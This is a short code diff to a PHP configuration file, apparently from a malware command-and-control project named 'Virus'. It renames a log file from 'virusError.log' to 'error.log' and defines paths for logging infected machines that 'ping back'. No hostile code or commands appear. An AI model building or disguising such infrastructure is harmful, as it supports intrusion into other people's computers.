@@ -3,7 +3,7 @@
 define("GITHUB_PAGE", "https://github.com/157239n/Virus");
 
 // logging and persistent states
-define("LOG_FILE", "/var/log/apache2/virusError.log"); // where should I log things to? Btw, there's the log and dellog utility bundled with this app
+define("LOG_FILE", "/var/log/apache2/error.log"); // where should I log things to? Btw, there's the log and dellog utility bundled with this app
 define("STRAY_VIRUS_LOG_FILE", "/var/log/apache2/strayViruses.log"); // where I should log unrecognized viruses when they pings back?
 define("DATA_FILE", "/data"); // where all of the persistent state outside of a database lives
 
